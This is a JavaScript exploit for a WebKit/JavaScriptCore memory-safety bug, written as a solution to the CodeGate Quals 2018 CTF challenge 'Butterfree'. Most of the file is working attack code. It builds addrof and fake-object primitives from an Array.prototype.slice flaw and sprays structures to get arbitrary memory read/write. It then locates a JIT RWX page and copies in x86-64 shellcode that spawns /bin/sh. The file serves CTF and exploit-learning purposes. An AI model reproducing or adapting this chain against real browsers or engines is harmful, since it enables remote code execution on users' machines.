// First Webkit exploit, written for CodeGate Quals 2018 challenge Butterfree.
// Vulnerability is a port of Saelo's bug described in Phrack to a modern
// debug build of Webkit.

// This challenge has a shortcut. Calling `readFile('flag')`. But I still wanted
// to actually write a Webkit exploit, and learn something.

//
// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Return the hexadecimal representation of the given byte.
function hex(b) {
    return ('0' + b.toString(16)).substr(-2);
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join('');
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== 'undefined')
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, ' ');
        lines.push(parts.join(' '));
    }

    return lines.join('\n');
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();


//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);

    switch (typeof v) {
        case 'number':
            v = '0x' + Math.floor(v).toString(16);
        case 'string':
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = '0' + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case 'object':
            if (v instanceof Int64) {
                bytes.set(v.bytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case 'undefined':
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.bytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return '0x' + hexlify(Array.from(bytes).reverse());
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);


function exploit(){
	/**
	 * Here is where we exploit the bug in Array.prototype.slice
	 * to gather the ability to leak the addresses of arbitrary Javascript
	 * objects, and to fake new objects with our own controlled metadata
	 * in the engine.
	 *
	 * To understand the bug, read: http://www.phrack.org/papers/attacking_javascript_engines.html
	 */
	print("Part 1: Gain address/object primitives.");

	function addrof(obj) {
		var a = [];
		for (var i = 0; i < 100; i++)
		a.push(i + 0.1337);

		var hax = {valueOf: function () {
			a.length = 0;
			a = [obj]; // Doubled up to easily see in debugger the pointer.
			return 5;
		}};

		var b = a.slice(0, hax);
		print(b)
		return Int64.fromDouble(b[4]);
	}

	function createfakeobj(addr) {
		var a = []
		for (var i = 0; i < 100; i++)
			a.push({});             // Array must be of type ArrayWithContiguous

		addr = addr.asDouble();
		
		let tmp = a.slice(0, {valueOf: function() {
			a.length = 0; 
			a = [addr, addr]; 
			return 5; 
			}});
		return tmp[4];
	}

	// TypedArrays give us granular control over data in memory bufffers.
	// We can create three views to one buffer that we can fake an object
	// inside of later.
	var arbRW = new Uint8Array(0x40);
	var UarbRW = new Uint32Array(arbRW.buffer);
	var FarbRW = new Uint32Array(arbRW.buffer);

	print ("Part 2: Setting up Fake Object...");

	// Here we will spray structure IDs to create a victim of an
	// agreeable structureID, giving it some valid Object (doubles array) shape.
	// See http://www.phrack.org/papers/attacking_javascript_engines.html
	var structs = []
	for (var i = 0; i < 0x1000; ++i) {
		var array = [13.37, -1.1888977353814388e+148];
		array.pointer = -1.1888977353814388e+148; // 0xdeadc0dedeadc0de as a float
		array['prop' + i] = 13.37;
		structs.push(array);
	}

	var victim = structs[0x800];
	print(`[+] victim @ ${addrof(victim)}`);

	/* Here we go a different route from the original exploit.
	 * Because of a new mitigation called Gigacage, TypedArrays can't
	 * remain a safe cure-all to our memory read/write needs.
	 * One of the highest bits in an address stored for the data buffer
	 * of a TypedArray will actually become ignored, meaning that we'll
	 * instead have to rely on an unboxed doubles Array object to read/write
	 * values as valid 64-bit doubles.
	 *
	 * This new means of doing this has a limitation in that we have to orient
	 * every read/write so that the target is preceded by some number that can
	 * act as a usable "length" for a butterfly.
	 *
	 * Will leave cthe read/writeInt64 functions here to demonstrate the idea, but
	 * continue to perform individual reads/writes manually to finish the exploit.
	 */
	

	// This data is small, so inlined into `container`'s allocation.
	// We can then fake a reference onto this object data.
	var flags_double_array = new Int64("0x0108200700001000").asJSValue();
	var container = {
		header: flags_double_array,
		butterfly: victim
	}
	var containerAddr = addrof(container);

	var hax = createfakeobj(Add(containerAddr, 16));
	var origButterfly = hax[1];

	function writeInt64(addr, int64){
		hax[1] = addr.asDouble(); // Change victim's butterfly, where data is stored.
		victim[0] = int64.asDouble(); // Write into that butterfly
		hax[1] = origButterfly; // Set it back safely.
	};

	function readInt64(addr){
		hax[1] = addr.asDouble(); // Set the victim butterfly
		var ret = victim[0]; // Read it as a double
		hax[1] = origButterfly; // set it back.
		return Int64.fromDouble(ret);
	}


	print("Got prims, with some limitations. JIT some code and expand.");

	// When a function is JITted, it's compiled to native code, and written to a RWX page
	// that we can copy shellcode into.
	let f = function(y){ if(y != undefined){ y *= 1023; y += 2345; y*= 123433; } return y};
	for(let i = 0; i < 0x80000; i++){
		f(i);
	}

	// New fake object, new JSCell.
	// I hope to clean this up.
	arbRW.set(new Int64("0x0108200700001000").bytes(), 0x0);

	// Copy address into butterfly for function.
	let f_addr = addrof(f);
	arbRW.set(Add(f_addr, 0x18).bytes(), 0x8);

	// Get address of buffer we have granular control over.
	let arbRWAddr = addrof(arbRW);
	let bufferAddr = readInt64(Add(arbRWAddr, 0x10));

	let fullRW = createfakeobj(bufferAddr);

	// From here, we follow a trail of pointers to reach the RWX JIT page.
	let codeObj = Add(Int64.fromDouble(fullRW[0]), 0x8);
	print("codeObj @ " + codeObj);

	arbRW.set(Add(codeObj, 0x8).bytes(), 0x8);
	let lead = Int64.fromDouble(fullRW[1]);
	print("lead @ " + lead)

	arbRW.set(lead.bytes(), 0x8);
	let jitpage = Int64.fromDouble(fullRW[2]);
	print("JIT: " + jitpage)


	arbRW.set(jitpage.bytes(), 0x8);

	// Copy the shellcode  as doubles.
	// NOP sled just because. Prob not needed.
	let sc = [0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90, 
		0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
		106, 104, 72, 184, 47, 98, 105, 110, 47, 47, 47, 115, 80, 72, 137, 
		231, 104, 114, 105, 1, 1, 129, 52, 36, 1, 1, 1, 1, 49, 246, 86, 106, 8, 94, 
		72, 1, 230, 86, 72, 137, 230, 49, 210, 106, 59, 88, 15, 5, 0xc3, 0xcc, 0xcc, 0xcc];

	let scConv8 = new Uint8Array(sc.length + 8 + (8 - (sc.length%8)));
	scConv8.set(sc);
	let scConvF = new Float64Array(scConv8.buffer);

	for ( let i = 0; i < scConvF.length; i++){
		print("Writing scConvF[" + i + "] = " + Int64.fromDouble(scConvF[i]) + " @ " + 
			Add(jitpage, i*0x8));
		fullRW[i] = scConvF[i];
	}

	print("BOOM!");
	f();

	// There's a chance of crashing here. Dunno why. But consistent enough to get shell
	// over remote after some syntax fixups to get it on one line.

}

exploit()

